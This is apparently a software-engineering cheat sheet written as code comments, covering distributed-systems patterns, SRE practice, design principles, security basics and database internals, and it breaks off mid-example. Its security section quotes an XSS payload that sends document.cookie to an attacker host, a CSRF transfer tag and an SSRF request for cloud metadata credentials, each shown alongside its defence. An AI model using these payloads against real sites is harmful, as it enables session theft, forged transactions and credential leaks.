// CAP Theorem Trade-off Matrix
// Network partitions (P) are inevitable in physical distributed networks:
// 1. CP System (e.g. etcd, ZooKeeper, CockroachDB):
//    - Rejects writes or times out when quorum is lost -> Guarantees Consistency
// 2. AP System (e.g. Cassandra, DynamoDB with eventual consistency):
//    - Accepts writes locally during partition -> Guarantees Availability, sacrifices instant Consistency

// PACELC Classification Examples:
// If Partition (P):
//    Trade-off: [A]vailability vs [C]onsistency
// Else (E) [Normal Operation]:
//    Trade-off: [L]atency vs [C]onsistency
//
// Examples:
// - DynamoDB / Cassandra : PA/EL (Available on partition, Low Latency normally)
// - MongoDB / Spanner    : PC/EC (Consistent on partition, Consistent normally)

// Two-Phase Commit (2PC) Sequence:
// Phase 1: Prepare
Coordinator -> Node A: PREPARE?
Coordinator -> Node B: PREPARE?
Node A -> Coordinator: VOTE_COMMIT (locks held)
Node B -> Coordinator: VOTE_COMMIT (locks held)
// Phase 2: Commit
Coordinator -> Node A: GLOBAL_COMMIT
Coordinator -> Node B: GLOBAL_COMMIT
// Warning: Blocking protocol! If Coordinator dies mid-vote, participants hold locks indefinitely.

// Saga Execution Pattern (Choreography or Orchestrator):
// Step 1: OrderService.createOrder() -> SUCCESS
// Step 2: PaymentService.chargeCard() -> SUCCESS
// Step 3: InventoryService.reserveStock() -> FAILED (Out of stock!)
// Compensation Flow triggered:
// -> PaymentService.refundPayment()
// -> OrderService.cancelOrder()
// Preserves eventual consistency without blocking distributed locks.

// CQRS Architecture:
// Write Path (Commands):
// Client -> POST /orders -> CommandHandler -> OrdersWriteDB (Normalized, ACID)
//                           |
//                     Domain Event (OrderCreated)
//                           v
// Read Path (Queries):
// Projection Worker -> Updates ElasticSearch / Redis (Denormalized Read Model)
// Client -> GET /orders/{id} -> QueryService -> Reads directly from fast Read Model

// Event Sourcing: State as a fold/reduce over historical events
// Instead of: UPDATE accounts SET balance = 250 WHERE id = 1;
// Append to Event Store:
// 1. AccountOpened { id: 1, initialDeposit: 100, at: '2026-01-01' }
// 2. FundsDeposited { amount: 200, at: '2026-01-02' }
// 3. FundsWithdrawn { amount: 50, at: '2026-01-03' }
// Current State = events.reduce((balance, e) => apply(balance, e), 0); // balance = 250

// Stripe-style Idempotency Key Pattern:
// POST /v1/charges
// Headers: { "Idempotency-Key": "req_8f3d1b9a2c" }
//
// Server Logic:
// 1. Check Redis for key "idemp:req_8f3d1b9a2c"
// 2. If exists: return cached response immediately (no re-charge!)
// 3. If missing: atomically acquire lock, process charge, store result, return response.

// Reactive Streams / TCP Backpressure:
// Fast Producer (10,000 msgs/sec) ---> Slow Consumer (500 msgs/sec)
// Without Backpressure: Consumer runs Out Of Memory (OOM) or drops packets.
// With Backpressure (e.g. Reactive Streams, TCP Windowing, Akka):
// Consumer: "I have buffer capacity for 100 messages (request(100))"
// Producer: Sends exactly 100 messages, then waits for next demand signal.

// Circuit Breaker State Machine:
// [CLOSED] --(Failure rate > threshold)--> [OPEN]
//    ^                                        |
//    |                                        | (Sleep window expires, e.g. 10s)
//    |                                        v
//    +---(Probe request succeeds)------- [HALF-OPEN]
//        (Probe request fails: back to OPEN)
// When OPEN: Fails fast immediately without calling troubled remote service.

// Bulkhead Isolation Example (Thread/Connection Pools):
// Shared pool anti-pattern: Slow search service consumes all 100 HTTP threads -> Checkout stalls!
// Bulkhead pattern:
//   Pool A (Checkout Service): 50 Dedicated Connections (Guaranteed critical path)
//   Pool B (Search / Ads):     30 Dedicated Connections (Isolated)
//   Pool C (Reporting / Batch):20 Dedicated Connections (Isolated)
// Search timeout never exhausts Checkout resources.

// Transactional Outbox Pattern:
// 1. In ONE local ACID transaction:
//    BEGIN;
//      INSERT INTO orders (id, user_id, total) VALUES (42, 101, 99.99);
//      INSERT INTO outbox_events (id, aggregate_type, payload) 
//        VALUES ('evt_1', 'Order', '{"order_id":42,"event":"OrderCreated"}');
//    COMMIT;
// 2. CDC process (Debezium) or poller reads outbox_events and publishes to Kafka.
// Guarantees zero lost events without dual-write inconsistency!

// Change Data Capture (CDC) Architecture:
// Postgres (WAL / Logical Replication Slot)
//    |
//    v (Streams raw byte-level log mutations)
// Debezium / Kafka Connect
//    |
//    v (Transforms to JSON / Avro events)
// Kafka Topic: "db.public.users"
//    +---> ElasticSearch Sink (Search index updated in ~10ms)
//    +---> Snowflake / BigQuery (Near real-time analytical warehouse)

// Consistent Hash Ring Concept:
// Traditional: node = hash(key) % N -> Changing N invalidates almost 100% of keys!
// Consistent Hashing:
// Keys and Nodes mapped to 0..2^32-1 ring.
// Key belongs to first node encountered clockwise.
// Adding node B between A and C only moves keys between A and B;
// All other nodes' keys remain untouched. Virtual nodes prevent hot spots.

// Split-Brain Scenario in 3-Node Cluster:
// Node 1 (DC-East) <--- [NETWORK PARTITION] ---> Node 2, Node 3 (DC-West)
// Prevention: Quorum Consensus (Q = floor(N/2) + 1)
// Majority needed to accept writes: 3 nodes -> Quorum = 2
// - DC-East (1 node): Lost quorum -> Rejects writes / Becomes Read-Only
// - DC-West (2 nodes): Has quorum (2/3) -> Continues safely

// Byzantine Fault Tolerance (Lamport, Shostak, Pease):
// Nodes may be faulty, crashed, delayed, OR maliciously deceptive (traitor).
// In standard crash-fault consensus (Raft/Paxos): Assumes nodes don't lie.
// In BFT (e.g. PBFT, Tendermint):
// System can tolerate up to f malicious nodes if total nodes N >= 3f + 1.
// Example: To tolerate 1 traitor node, you need at least 4 nodes.

// Google SRE Hierarchy:
// 1. SLI (Indicator) : Exact metric measured (e.g. % of HTTP requests < 200ms)
// 2. SLO (Objective) : Internal engineering target (e.g. SLI >= 99.9% over 30 days)
// 3. SLA (Agreement) : External commercial contract (e.g. If SLI < 99.0%, refund 10% credits)
// Golden Rule: Always make your internal SLO tighter than your customer-facing SLA!

// Error Budget Mechanics (SLO: 99.9% over 30 days):
// Total Time: 30 days * 24 hrs * 60 mins = 43,200 minutes
// Allowed Downtime = 43,200 * (1 - 0.999) = 43.2 minutes
//
// SRE Policy:
// - Budget Remaining > 0: Product teams deploy new features aggressively.
// - Budget Depleted (0%): Deployments freeze! All sprints pivot to stability & bugs.

// Google SRE 4 Golden Signals:
// 1. Latency   : Time taken to service a request (differentiate successful vs failed requests!)
// 2. Traffic   : Demand placed on system (e.g. HTTP req/sec, concurrent WebSocket sessions)
// 3. Errors    : Rate of requests that fail (HTTP 5xx, incorrect payload, exception rate)
// 4. Saturation: How 'full' your most constrained resource is (e.g. 90% connection pool, 85% CPU memory bus)

// The RED Method (Tom Wilkie / Weaveworks for Request-driven microservices):
// - Rate     : Number of requests your service is serving per second (RPS).
// - Errors   : Number of failed requests per second.
// - Duration : The amount of time each request takes (usually measured in p50, p95, p99 percentiles).
// Complementary to the USE method (which is hardware/resource focused).

// The USE Method (Brendan Gregg - for analyzing any computing resource):
// For every resource (CPU, Memory, Disk, Network, Connection Pool):
// 1. Utilization : % of time resource was busy (e.g. CPU 82% over 60s)
// 2. Saturation  : Queue depth / backlog waiting to be serviced (e.g. Linux load avg > core count)
// 3. Errors      : Count of error events (e.g. dropped network frames, ECC memory retries)

// Incident Lifecycle Metrics:
// [Incident Begins] 
//      | <-- MTTD (Mean Time To Detect - via alerts/monitoring) 
// [Alert Fires] 
//      | <-- MTTR (Mean Time To Restore/Recover - via mitigation/rollback)
// [Service Restored]
//      | <-- MTBF (Mean Time Between Failures - reliability metric)
// [Next Incident Begins]
// Mature engineering organizations prioritize minimizing MTTD and MTTR over chasing impossible zero failures.

// Thundering Herd / Cache Stampede:
// Key 'trending_products' expires in Redis.
// 5,000 incoming requests/sec find key MISSING -> 5,000 queries hit Postgres at the same millisecond -> DB crashes!
// Solutions:
// 1. Mutex / Singleflight: Only 1 request queries DB; others wait on promise.
// 2. Probabilistic Early Expiration (XFetch algorithm).
// 3. Background cache refresher.

// Cascading Failure Anatomy:
// 1. Service A node 1 crashes due to high traffic.
// 2. Traffic redistributes to nodes 2 and 3.
// 3. Nodes 2 and 3 get overwhelmed and crash -> Entire Service A is dead.
// 4. Upstream Gateway threads block waiting on Service A timeouts.
// 5. Gateway thread pool exhausts -> Entire website returns 504 Gateway Timeout!
// Defense: Aggressive timeouts, circuit breakers, load shedding, and retries with jitter.

// OpenTelemetry Distributed Tracing Model:
// Trace ID: 4bf92f3577b34da6a3ce929d0e0e4736
// ├── Span 1: [Gateway] GET /checkout (250ms)
// │   ├── Span 2: [AuthService] verifyToken (15ms)
// │   └── Span 3: [OrderService] createOrder (220ms)
// │       ├── Span 4: [Postgres] INSERT INTO orders (35ms)
// │       └── Span 5: [PaymentService] chargeCard (170ms)
// Baggage: { "userId": "u123", "tier": "enterprise" } propagated across HTTP headers.

// Etsy & Google SRE Post-Mortem Principles:
// - Core Assumption: Humans do not deliberately break production. Mistakes happen because tools, guardrails, or processes allowed it.
// - Focus Questions:
//   1. What systemic conditions allowed this state to occur?
//   2. Why did our automated tests & monitoring not detect it sooner?
//   3. How do we make this class of failure physically impossible in the future?

// Chaos Engineering (Netflix Chaos Monkey / Gremlin):
// Hypothesis: 'If an entire AWS Availability Zone goes dark, user checkout success rate will remain > 99.5%.'
// Experiment:
// 1. Measure baseline steady-state metrics.
// 2. Inject turbulence: simulate latency, kill random Kubernetes pods, drop network packets.
// 3. Verify hypothesis against steady-state.
// 4. Find weaknesses before real outages find them for you.

// High Water Mark in Distributed Logs (Kafka / Raft):
// - Log End Offset (LEO): The latest record written by producer to leader.
// - High Water Mark (HWM): The highest offset replicated across ALL in-sync replicas (ISR).
// -> Consumers can ONLY read records up to the HWM to prevent dirty reads of uncommitted records that could be lost on leader election.

// Load Shedding Strategy during 3x Traffic Surge:
// When CPU > 85% or Queue Latency > 500ms:
// 1. Drop tier-3 requests immediately: HTTP 429 / 503 for recommendations, analytics, comments.
// 2. Disable heavy features: Return static product catalog without personalized recommendations.
// 3. Keep critical path alive: 100% of resources dedicated to Checkout & Payment APIs.
// It is far better to serve 70% of users perfectly than to crash and serve 0% of users.

// Dead Letter Queue (DLQ) Architecture:
// Message Broker (Kafka / SQS / RabbitMQ)
//    |
//    v (Consume)
// Consumer Service --[Processing Exception (e.g. malformed JSON)]--> Retry 1..3
//    |
//    v (Exceeded Max Retries)
// DLQ (e.g. 'orders-dlq')
//    |
//    +--> Alerts SRE / Dev Team via PagerDuty
//    +--> Prevents poison pill message from blocking remaining 10,000 valid messages in main queue!

// Conway's Law (Melvin Conway, 1967):
// 'Organizations which design systems... are constrained to produce designs which are copies of the communication structures of these organizations.'
// Inverse Conway Maneuver:
// If you want a decoupled, modular microservice architecture, organize small, autonomous cross-functional teams around distinct business capabilities rather than siloed frontend/backend/DB teams.

// Hyrum's Law (Hyrum Wright, Google):
// 'With a sufficient number of users of an API, it does not matter what you promise in the contract: all observable behaviors of your system will be depended on by somebody.'
// Example:
// You sort JSON keys alphabetically internally as an implementation detail.
// You release a patch changing the internal map order.
// 50 clients break because they implicitly depended on sorted keys even though the spec never promised it!

// Chesterton's Fence (G.K. Chesterton):
// Senior SWE scenario:
// Junior Dev: 'Look at this bizarre sleep(500) and weird null check in the payment gateway. It looks useless, let me delete it!'
// Senior Dev: 'Do not remove it until you discover WHY it was put there.'
// Investigation reveals: Upstream bank has a race condition where webhooks arrive 300ms before ledger commits.

// Gall's Law (John Gall):
// 'A complex system that works is invariably found to have evolved from a simple system that worked. A complex system designed from scratch never works and cannot be patched up to make it work.'
// Architecture takeaway:
// Do not start a greenfield project with 40 microservices, Kubernetes, Kafka, and Istio service mesh.
// Start with a clean, well-modularized monolith, prove the business domain, then decompose where needed.

// Brooks' Law (Fred Brooks, 'The Mythical Man-Month'):
// 'Adding manpower to a late software project makes it later.'
// Reasons:
// 1. Ramp-up time: Existing senior engineers must divert time from coding to mentor new hires.
// 2. Combinatorial communication channels: n * (n - 1) / 2 connections.
//    - Team of 4: 6 communication paths
//    - Team of 10: 45 communication paths!

// Law of Demeter Violation (Train Wreck):
// order.getCustomer().getAddress().getCity().getPostalCode();
// If the structure of Address changes, Order's caller breaks!
//
// Clean Demeter Adherence (Tell, Don't Ask):
// order.getCustomerPostalCode();
// Each unit only has knowledge of its direct collaborators.

// Postel's Law (Jon Postel - RFC 793):
// 'Be conservative in what you do, be liberal in what you accept from others.'
// Application in API Design:
// - When emitting data: Strictly conform to JSON specifications, exact typing, and documentation.
// - When consuming data: Ignore unknown fields gracefully, accept flexible date formats, don't crash on extra whitespace.

// Single Responsibility Principle (Robert C. Martin):
// Violation:
// class UserReport {
//   func calculatePay() { ... }     // Changes when CFO changes finance policy
//   func saveToDatabase() { ... }   // Changes when DBA changes database schema
//   func printReport() { ... }      // Changes when COO changes visual format
// }
// Split into: PaymentCalculator, UserRepository, ReportFormatter.

// Open/Closed Principle (Bertrand Meyer):
// Anti-pattern (Modification):
// func calculateDiscount(customer) {
//   if customer.type == 'VIP' return 0.2
//   if customer.type == 'STUDENT' return 0.1 // Modifying core logic for every new customer type!
// }
// OCP Pattern (Extension via Polymorphism):
// interface DiscountPolicy { func calculate(): float }
// VIPPolicy implements DiscountPolicy; StudentPolicy implements DiscountPolicy;

// Liskov Substitution Principle (Barbara Liskov):
// Classic Violation:
// class Rectangle { setWidth(w); setHeight(h); }
// class Square extends Rectangle {
//   setWidth(w) { this.width = w; this.height = w; } // Breaks callers expecting independent height!
// }
// If code expects a Rectangle and you pass a Square, it behaves incorrectly.
// Subclasses must adhere to contracts and invariants of base classes.

// Interface Segregation Principle:
// Bloated Interface (Violation):
// interface Worker { func work(); func eat(); func sleep(); }
// class RobotWorker implements Worker {
//   func eat() { throw UnsupportedOperationException() } // Smelly!
// }
// Segregated Interfaces:
// interface Workable { func work() }
// interface Feedable { func eat() }
// RobotWorker only implements Workable.

// Dependency Inversion Principle:
// Direct Dependency (Tight Coupling):
// class OrderService {
//   private sqlDatabase = new PostgresConnection(); // High-level depends on low-level!
// }
// Inverted Dependency (Loose Coupling via DI):
// interface OrderRepository { func save(order: Order) }
// class OrderService {
//   constructor(private repo: OrderRepository) {} // Injected via constructor!
// }

// Sandi Metz / Kent C. Dodds on Code Abstraction:
// - DRY : Don't Repeat Yourself (Consolidate duplicate knowledge).
// - WET : Write Everything Twice (Wait until you have 3 distinct use cases before abstracting).
// - AHA : Avoid Hasty Abstractions! 
// 'Duplication is far cheaper than the wrong abstraction.'
// An overly clever premature abstraction forces unrelated features to share warped parameters.

// Strangler Fig Pattern (Martin Fowler):
// Named after the Australian strangler fig vine that grows around a host tree until it replaces it.
// Architecture Flow:
// Client Requests ---> [Reverse Proxy / API Gateway]
//                          ├── /checkout -> Routed to NEW Microservice
//                          ├── /search   -> Routed to NEW Microservice
//                          └── /*        -> Routed to LEGACY Monolith
// Avoids catastrophic 'Big Bang' rewrites by migrating feature-by-feature in production.

// OAuth 2.0 vs OIDC:
// - OAuth 2.0 (Authorization): 'Can this app access your Google Drive photos on your behalf?'
//   -> Yields: Access Token (opaque or JWT) passed in Authorization: Bearer <token>
// - OIDC (Authentication): 'Who is the currently logged-in user?'
//   -> Built on top of OAuth 2.0
//   -> Yields: ID Token (signed JWT containing 'sub', 'email', 'name', etc.)

// Anatomy of a JWT: xxxxx.yyyyy.zzzzz
// 1. Header    (base64url): { "alg": "RS256", "typ": "JWT" }
// 2. Payload   (base64url): { "sub": "user_123", "role": "admin", "exp": 1717000000 }
// 3. Signature (HMAC/RSA) : RSASHA256(base64Url(Header) + "." + base64Url(Payload), privateKey)
// Critical SWE Rule: Payloads are SIGNED, NOT ENCRYPTED (anyone can read the base64 payload!). Never put secrets in JWTs.

// PKCE (Pronounced 'pixy' - RFC 7636):
// Solves: Public clients (React apps, iOS apps) cannot securely store client_secret.
// Flow:
// 1. Client creates random secret: code_verifier
// 2. Client hashes it: code_challenge = SHA256(code_verifier)
// 3. Client sends code_challenge with /authorize request
// 4. Client exchanges auth_code + original code_verifier with /token
// 5. Auth Server hashes verifier to confirm it matches challenge -> Issues token!

// RBAC vs ABAC Comparison:
// - RBAC (Role-Based Access Control):
//   User -> Role ('Editor') -> Permissions ['edit_post', 'view_post']
//   Limitation: Hard to express: 'Can edit posts ONLY if post is a draft AND department matches'
// - ABAC (Attribute-Based Access Control):
//   Rule: Allow if (user.dept == resource.dept AND time.hour < 18 AND resource.status == 'DRAFT')

// Mutual TLS (mTLS) in Service Meshes (Envoy / Istio):
// Standard TLS: Client verifies Server identity (e.g. browser trusts bank.com).
// mTLS: Server ALSO verifies Client certificate!
// 1. Service A connects to Service B.
// 2. Service B presents its cert -> Service A verifies it.
// 3. Service A presents its client cert -> Service B verifies it.
// Result: Zero-trust wire encryption + cryptographic identity verification for every microservice call.

// Zero Trust Core Tenet:
// Traditional: 'Castle and Moat' -> Hard outer firewall, but once inside the VPN, all servers trust each other.
// Zero Trust:
// Perimeter assumption is dead. Assume attackers are ALREADY on the internal network.
// Requirements:
// 1. Authenticate and authorize every request explicitly (mTLS, OIDC).
// 2. Least privilege access.
// 3. Continuous monitoring and micro-segmentation.

// Principle of Least Privilege in AWS IAM:
// Anti-pattern (Over-permissioned):
//   Effect: 'Allow', Action: '*', Resource: '*'
//   If microservice is compromised via SSRF, attacker has total cloud control!
// PoLP Pattern:
//   Effect: 'Allow'
//   Action: ['s3:GetObject']
//   Resource: 'arn:aws:s3:::customer-invoices/${aws:PrincipalTag/OrgId}/*'
// Limits blast radius to minimum required surface.

// Defense in Depth Layering:
// 1. Edge/Network: Cloudflare WAF, DDoS protection, rate limiting.
// 2. Gateway/Ingress: TLS termination, IP whitelisting, CORS, CSP.
// 3. Application: Input validation, parameterized queries, OIDC auth, RBAC.
// 4. Service Mesh: mTLS, network policies, egress filtering.
// 5. Data: Encryption at rest (AES-256), column-level masking, audit logging.
// If any single layer fails, subsequent layers prevent total compromise.

// CORS Essentials:
// Same-Origin Policy (SOP): Browsers block https://evil.com from reading data from https://yourbank.com/api/balance.
// CORS Headers (Sent by server to allow cross-origin reads):
// Access-Control-Allow-Origin: https://app.trusted-partner.com
// Access-Control-Allow-Methods: GET, POST, OPTIONS
// Preflight (OPTIONS): Sent automatically by browser for complex requests before the actual request.

// XSS vs CSRF:
// - XSS (Cross-Site Scripting):
//   Attacker injects <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
//   Mitigation: Output encoding, Content Security Policy (CSP), HttpOnly cookies.
// - CSRF (Cross-Site Request Forgery):
//   User is logged into bank.com. Visits malicious site with <img src='https://bank.com/transfer?amount=1000&to=attacker'>
//   Mitigation: SameSite=Strict cookies, Anti-CSRF tokens.

// Content Security Policy (CSP) Header Example:
// Content-Security-Policy: 
//   default-src 'self'; 
//   script-src 'self' https://apis.google.com; 
//   style-src 'self' 'nonce-rAnd0m123'; 
//   object-src 'none'; 
//   frame-ancestors 'none';
// Defeats XSS by instructing browser to refuse inline <script> tags or scripts from unauthorized domains!

// SSRF in Action (Capital One Breach style):
// Vulnerable endpoint: POST /api/fetch-avatar { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
// Server naively executes HTTP GET from its own AWS EC2 environment.
// AWS metadata service returns instance IAM role credentials to attacker!
// Defense: Egress firewalls, IMDSv2 (requires session token), strict URL allowlists.

// Catastrophic Backtracking (ReDoS):
// Vulnerable Regex: ^(a+)+$
// String 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!'
// Engine tries every possible combination of splits: O(2^N) exponential complexity!
// For N=30, computation requires 1,000,000,000 steps -> 100% CPU lockup on Node.js single thread.
// Defense: Linear time regex engines (RE2), input length limits, timeouts.

// ACID vs BASE Paradigms:
// - ACID (Pessimistic / Strict):
//   Atomicity: All-or-nothing
//   Consistency: Valid database invariants
//   Isolation: Concurrent transactions don't interfere
//   Durability: Committed data survives crashes
// - BASE (Optimistic / Distributed):
//   Basically Available: High availability guaranteed
//   Soft state: State may fluctuate over time without user input
//   Eventual consistency: System converges over time

// Workload Spectrum:
// 1. OLTP (Online Transaction Processing - e.g. Postgres, MySQL):
//    - High volume of simple, low-latency queries (SELECT/INSERT/UPDATE by ID).
//    - Row-oriented storage layout.
// 2. OLAP (Online Analytical Processing - e.g. ClickHouse, Snowflake, BigQuery):
//    - Long-running scans across billions of records (SUM, AVG, GROUP BY).
//    - Columnar storage layout.
// 3. HTAP (Hybrid Transactional/Analytical Processing - e.g. TiDB, SingleStore).

// Read-Your-Writes Problem in Asynchronous Replication:
// 1. User updates profile picture -> Written to Primary DB.
// 2. Browser immediately redirects and fetches profile picture from Read Replica.
// 3. Replica has 300ms replication lag -> User sees their old picture! (Frustration!)
// Solution:
// - Route user's reads to Primary for 5 seconds after a write.
// - Pin session reads to replica only if replica's LSN >= user's write LSN.

// SQL Standard Isolation Levels vs Anomalies:
// Level               | Dirty Read | Non-Repeatable Read | Phantom Read
// --------------------+------------+---------------------+-------------
// Read Uncommitted    | YES        | YES                 | YES
// Read Committed      | NO         | YES                 | YES
// Repeatable Read     | NO         | NO                  | YES (in standard)
// Serializable        | NO         | NO                  | NO

// Write Skew Classic Example (Doctors On Call):
// Invariant: At least 1 doctor must be on call at all times.
// State: Alice and Bob are both currently on call.
// - Tx 1 (Alice): Checks if count(on_call) > 1 -> Yes (2). Alice goes off call.
// - Tx 2 (Bob)  : Checks if count(on_call) > 1 -> Yes (2). Bob goes off call.
// Under Repeatable Read / Snapshot Isolation: BOTH transactions commit successfully!
// Result: 0 doctors on call (Invariant broken!).
// Fix: Strict Serializable isolation or SELECT ... FOR UPDATE.

// MVCC Mechanics in PostgreSQL:
// When you UPDATE a row:
// - Postgres does NOT overwrite the row on disk.
// - It marks the old row's xmax = current_tx_id (now dead to future transactions).
// - It inserts a brand NEW row with xmin = current_tx_id.
// Concurrent readers continue reading the old version without waiting for locks!
// VACUUM later cleans up dead row versions (garbage collection).

// B-Tree vs LSM-Tree Comparison:
// 1. B-Tree (PostgreSQL, MySQL InnoDB, SQLite):
//    - In-place page updates (random disk I/O).
//    - Fast reads (predictable O(log N) tree traversal).
// 2. LSM-Tree (Log-Structured Merge-Tree - RocksDB, Cassandra, Bigtable):
//    - Writes go to MemTable (RAM) + sequential WAL (fast!).
//    - Flushed as immutable SSTables to disk; background compaction merges them.
//    - Exceptional write throughput; reads may require checking multiple SSTables + Bloom filters.

// Storage Amplification Metrics:
// - Write Amplification (WA):
//   Application requests to write 100 bytes.
//   Due to WAL + page allocation + SSTable compaction, storage writes 1,000 bytes.
//   WA = 1000 / 100 = 10x. High WA wears out SSD flash endurance.
// - Space Amplification: Ratio of total database file size to actual raw user data size.
// - Read Amplification: Reading 1 row requires scanning 5 different disk blocks.

// Bloom Filter Guarantees:
// - False Negatives: IMPOSSIBLE (If it says 'NO', element is 100% NOT in the set).
// - False Positives: POSSIBLE (If it says 'YES', element MIGHT be in the set).
// Usage in Databases (RocksDB / Cassandra):
// Before doing expensive disk I/O to check an SSTable for a key, check the in-memory Bloom filter.
// If Bloom filter returns FALSE -> Skip disk read entirely! Huge latency savings.

// Concurrency Strategies:
// - Pessimistic (PCC - e.g. SELECT ... FOR UPDATE):
//   Best when contention is high.
//   Locks rows immediately. Other transactions wait in queue until commit/rollback.
// - Optimistic (OCC - e.g. WHERE version = @current_version):
//   Best when contention is low (reads vastly outnumber writes).
//   UPDATE products SET stock = stock - 1, version = version + 1 
//   WHERE id = 42 AND version = 5;
//   If affected_rows == 0, another transaction updated first -> Retry!

// Compare-And-Swap (CAS) - Foundation of Lock-Free Concurrency:
// bool CAS(int* ptr, int expected, int new_value) {
//   if (*ptr == expected) {
//     *ptr = new_value;
//     return true; // Success!
